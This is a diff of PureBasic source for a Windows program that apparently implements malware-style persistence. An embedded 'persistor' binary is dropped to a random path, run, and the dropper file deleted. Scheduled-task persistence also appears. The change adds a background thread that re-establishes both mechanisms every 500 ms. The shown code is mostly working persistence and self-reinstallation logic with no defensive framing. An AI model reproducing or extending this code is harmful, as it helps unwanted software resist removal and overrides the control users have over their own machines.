@@ -8,6 +8,7 @@ Prototype GetModuleFileNameEx(hProcess.i,hModule.i,lpFilename.i,nSize.i)
 Global GetModuleFileNameEx_.GetModuleFileNameEx=GetFunction(OpenLibrary(#PB_Any,"psapi.dll"),"GetModuleFileNameExW")
 
 Declare.i IsPersistorRunning(persistorPath.s)
+Global.i PeristenceTerminateFlag=#False
 
 Procedure TaskPersistence()
   Define retval.i,startupTaskname.s,persistTaskname.s,appPath.s
@@ -33,7 +34,7 @@ Procedure RealtimePersistence()
       WriteData(0,?persistor,persistorsize)
       CloseFile(0)
       RunProgram(randomFullPath,#DQUOTE$+ProgramFilename()+#DQUOTE$+" "+#DQUOTE$+persistorFullPath+#DQUOTE$,"") ;pass our full path as the first commandline parameter and the designated install location for the persistor as the second commandline parameter  
-      Delay(500) ;let the persistor install into the right directory
+      Delay(1000) ;let the persistor install into the right directory and exit
       DeleteFile(randomFullPath)
     EndIf
     
@@ -41,10 +42,20 @@ Procedure RealtimePersistence()
   
 EndProcedure
 
+Procedure persistenceThread(*_)
+  While Not PeristenceTerminateFlag
+    TaskPersistence()
+    RealtimePersistence()  
+    Delay(500)
+  Wend
+EndProcedure
+
 
 Procedure DoPersistence()
-  TaskPersistence()
-  RealtimePersistence()
+  Static thread
+  If Not IsThread(thread)
+    thread=CreateThread(@persistenceThread(),0)  
+  EndIf
 EndProcedure
 
 Procedure.i IsPersistorRunning(persistorPath.s)
@@ -74,9 +85,9 @@ DataSection
   endmarker:
 EndDataSection
 
-; IDE Options = PureBasic 5.70 LTS (Windows - x64)
-; CursorPosition = 35
-; FirstLine = 18
+; IDE Options = PureBasic 5.70 LTS (Windows - x86)
+; CursorPosition = 36
+; FirstLine = 21
 ; Folding = -
 ; EnableAsm
 ; EnableThread
